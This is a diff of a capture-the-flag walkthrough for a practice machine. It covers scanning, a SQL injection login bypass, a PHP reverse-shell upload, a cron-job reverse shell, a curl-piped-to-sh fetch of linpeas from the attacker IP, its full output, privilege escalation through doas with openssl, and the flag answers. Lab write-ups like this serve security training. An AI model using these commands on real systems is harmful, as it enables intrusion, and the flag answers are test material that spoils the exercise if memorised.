@@ -59,7 +59,6 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
            Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
 
-
 ┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
 └─$ feroxbuster --url http://10.10.113.202 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403
 
@@ -91,7 +90,6 @@ by Ben "epi" Risher 🤓                 ver: 2.7.0
 [####################] - 44s     4614/4614    109/s   http://10.10.113.202 
 [####################] - 44s     4614/4614    106/s   http://10.10.113.202/ 
 [####################] - 39s     4614/4614    117/s   http://10.10.113.202/admin 
-
 
 http://10.10.113.202/admin/id_rsa
 
@@ -169,10 +167,7 @@ by Ben "epi" Risher 🤓                 ver: 2.7.0
 [###################>] - 35s     4597/4614    131/s   http://10.10.113.202:445/ 
 301      GET        9l       28w      333c http://10.10.113.202:445/management/database => http://10.10.113.202:445/management/database/
 
-
-
 I use Firefox dev tools to capture and inspect the network traffic, looking for any vulnerabilities on the web application. I then submit a blank username and password. The response is an error message.
-
 
 However, I find the exact SQL query structure used to sign in when inspecting the response.
 
@@ -200,7 +195,6 @@ admin' or 1+1--'
 or through metasploit 
 
 msfconsole -q -x "use multi/handler; set payload generic/shell_reverse_tcp; set lhost 10.18.1.77; set lport 4444; exploit"
-
 
 then upload a revshell php (create new staff)
 
@@ -282,7 +276,6 @@ drwxr-xr-x 2 www-data   www-data   4.0K Oct 28  2021 .
 drwxr-xr-x 4 root       root       4.0K Oct 28  2021 ..
 -rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh
 
-
     Create a new backup.sh file with a reverse shell script and changed it to be executable using chmod.
     setup a Netcat listener on my attack machine
     A few seconds later, the cronjob will run and attach the reverse shell to my waiting Netcat listener. Then I can stabilize the shell using the same technique.
@@ -317,7 +310,6 @@ plot_admin@plotted:~$ cat user.txt
 cat user.txt
 77927510d5edacea1f9e86602f1fbadb
 
-
 Vertical Scalation
 
 using linpeas.sh
@@ -337,10 +329,8 @@ using linpeas.sh
     php -S attacker_ip:port
     Curl with -s (silent) to load the script on the target machine and pipe it through sh to run LinPEAS.
 
-
 plot_admin@plotted:~$ curl -s 10.18.1.77:3000/linpeas.sh | sh
 curl -s 10.18.1.77:3000/linpeas.sh | sh
-
 
                             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                     ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
@@ -425,7 +415,6 @@ sh: 1197: rpm: not found
 sh: 1197: 0: not found
 sh: 1207: [[: not found
 
-
 ╔══════════╣ PATH
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                    
 /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin                                               
@@ -501,7 +490,6 @@ dmesg Not Found
    Details: https://seclists.org/oss-sec/2017/q1/184
    Exposure: less probable
    Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
-
 
 ╔══════════╣ Executing Linux Exploit Suggester 2
 ╚ https://github.com/jondonas/linux-exploit-suggester-2                                                    
@@ -801,7 +789,6 @@ org.freedesktop.thermald          - -               -                (activatabl
 org.freedesktop.timedate1         - -               -                (activatable) -                           -       -
 org.freedesktop.timesync1     25138 systemd-timesyn systemd-timesync :1.39         systemd-timesyncd.service   -       -
 
-
                                         ╔═════════════════════╗
 ════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════    
                                         ╚═════════════════════╝                                            
@@ -849,7 +836,6 @@ tcp   LISTEN 0      511                     *:80                 *:*
 ╔══════════╣ Can I sniff with tcpdump?
 No                                                                                                         
                                                                                                            
-
 
                                          ╔═══════════════════╗
 ═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════    
@@ -955,7 +941,6 @@ ubuntu           pts/0    10.20.1.36       Fri Jan 28 02:03:27 +0000 2022
 ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                            
 
-
                                        ╔══════════════════════╗
 ═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════     
                                        ╚══════════════════════╝                                            
@@ -1016,7 +1001,6 @@ lrwxrwxrwx 1 root root 35 Oct 28  2021 /etc/apache2/sites-enabled/000-default.co
         CustomLog ${APACHE_LOG_DIR}/access.log combined
 </VirtualHost>
 
-
 -rw-r--r-- 1 root root 2787 Oct 28  2021 /etc/apache2/sites-available/000-default.conf
 <VirtualHost *:80>
         ServerAdmin webmaster@localhost
@@ -1076,7 +1060,6 @@ pgsql.allow_persistent = On
         refuse options = checksum dry-run
         dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
 
-
 ╔══════════╣ Analyzing Ldap Files (limit 70)
 The password hash is from the {SSHA} to 'structural'                                                       
 drwxr-xr-x 2 root root 4096 Aug 24  2021 /etc/ldap
@@ -1085,15 +1068,11 @@ drwxr-xr-x 2 root root 32 Oct 15  2021 /snap/core18/2246/etc/ldap
 
 drwxr-xr-x 2 root root 32 Dec 15  2021 /snap/core18/2284/etc/ldap
 
-
 ╔══════════╣ Searching ssl/ssh files
 ╔══════════╣ Analyzing SSH Files (limit 70)                                                                
                                                                                                            
 -rw-r--r-- 1 www-data www-data 81 Oct 28  2021 /var/www/html/80/admin/id_rsa
 VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
-
-
-
 
 ChallengeResponseAuthentication no
 UsePAM yes
@@ -1142,7 +1121,6 @@ Subsystem       sftp    /usr/lib/openssh/sftp-server
 ══╣ /etc/hosts.allow file found, trying to read the rules:
 /etc/hosts.allow                                                                                           
 
-
 Searching inside /etc/ssh/ssh_config for interesting info
 Include /etc/ssh/ssh_config.d/*.conf
 Host *
@@ -1154,13 +1132,9 @@ Host *
 drwxr-xr-x 2 root root 4096 Sep 24 16:20 /etc/pam.d                                                        
 -rw-r--r-- 1 root root 2133 Jul 23  2021 /etc/pam.d/sshd
 
-
-
-
 ╔══════════╣ Searching tmux sessions
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                     
 tmux 3.0a                                                                                                  
-
 
 /tmp/tmux-1001
 ╔══════════╣ Analyzing Cloud Init Files (limit 70)
@@ -1181,9 +1155,6 @@ drwxr-xr-x 2 root root 200 Dec 15  2021 /snap/core18/2284/usr/share/keyrings
 drwxr-xr-x 2 root root 200 Sep 28  2021 /snap/core20/1169/usr/share/keyrings
 drwxr-xr-x 2 root root 200 Jan 14  2022 /snap/core20/1328/usr/share/keyrings
 drwxr-xr-x 2 root root 4096 Aug 24  2021 /usr/share/keyrings
-
-
-
 
 ╔══════════╣ Searching uncommon passwd files (splunk)
 passwd file: /etc/pam.d/passwd                                                                             
@@ -1253,77 +1224,22 @@ netpgp Not Found
 -rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
 -rw-r--r-- 1 root root 2867 Feb 13  2020 /usr/share/popularity-contest/debian-popcon.gpg
 
-
-
 ╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                            
 
 -rw-r--r-- 1 root root 69 Oct 25  2021 /etc/php/7.4/mods-available/ftp.ini
 -rw-r--r-- 1 root root 69 Oct 25  2021 /usr/share/php7.4-common/common/ftp.ini
 
-
-
-
-
-
 ╔══════════╣ Analyzing Bind Files (limit 70)
 -rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind                        
 -rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind
 
-
-
 ╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                            
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 lrwxrwxrwx 1 root root 20 Oct 28  2021 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
 lrwxrwxrwx 1 root root 24 Oct 28  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
 -rw-r--r-- 1 root root 81 Oct 28  2021 /var/lib/dpkg/alternatives/my.cnf
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 ╔══════════╣ Analyzing Other Interesting Files (limit 70)
 -rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc                                                 
@@ -1334,10 +1250,6 @@ lrwxrwxrwx 1 root root 24 Oct 28  2021 /etc/mysql/my.cnf -> /etc/alternatives/my
 -rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1169/etc/skel/.bashrc
 -rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1328/etc/skel/.bashrc
 
-
-
-
-
 -rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
 -rw-r--r-- 1 plot_admin plot_admin 807 Oct 28  2021 /home/plot_admin/.profile
 -rw-r--r-- 1 ubuntu ubuntu 807 Feb 25  2020 /home/ubuntu/.profile
@@ -1346,11 +1258,7 @@ lrwxrwxrwx 1 root root 24 Oct 28  2021 /etc/mysql/my.cnf -> /etc/alternatives/my
 -rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1169/etc/skel/.profile
 -rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1328/etc/skel/.profile
 
-
-
 -rw-r--r-- 1 ubuntu ubuntu 0 Oct 28  2021 /home/ubuntu/.sudo_as_admin_successful
-
-
 
                                          ╔═══════════════════╗
 ═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════    
@@ -1636,13 +1544,8 @@ Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written usi
  -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
                                                                                                            
 
-
-
  -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
                                                                                                            
-
-
-
 
 ╔══════════╣ Web files?(output limit)
 /var/www/:                                                                                                 
@@ -1792,7 +1695,6 @@ so
 ╔══════════╣ Checking doas.conf
 permit nopass plot_admin as root cmd openssl                                                               
 
-
 LinPEAS found a doas configuration file in the etc. directory. doas is used to execute commands as another user on the system. The configuration entry seen above allowed the plot_admin user to perform actions with OpenSSL as the root user. With this in hand, privilege escalation to root is very simple.
 
 plot_admin@plotted:~$ doas -u root openssl enc -in /root/root.txt
@@ -1818,29 +1720,14 @@ export TERM=xterm
 
 mv /var/www/scripts/backup.sh /var/www/scripts/backup_rfs.sh 
 
-
 ```
-
-![[Pasted image 20220924115429.png]]
-
-![[Pasted image 20220924115520.png]]
-
-![[Pasted image 20220924115832.png]]
-
-![[Pasted image 20220924115903.png]]
-
-![[Pasted image 20220924121851.png]]
 
 after upload the revshell
 
 What is user.txt?
 *77927510d5edacea1f9e86602f1fbadb*
 
-
-
 What is root.txt?
 *53f85e2da3e874426fa059040a9bdcab*
-
-
 
 [[GLITCH]]
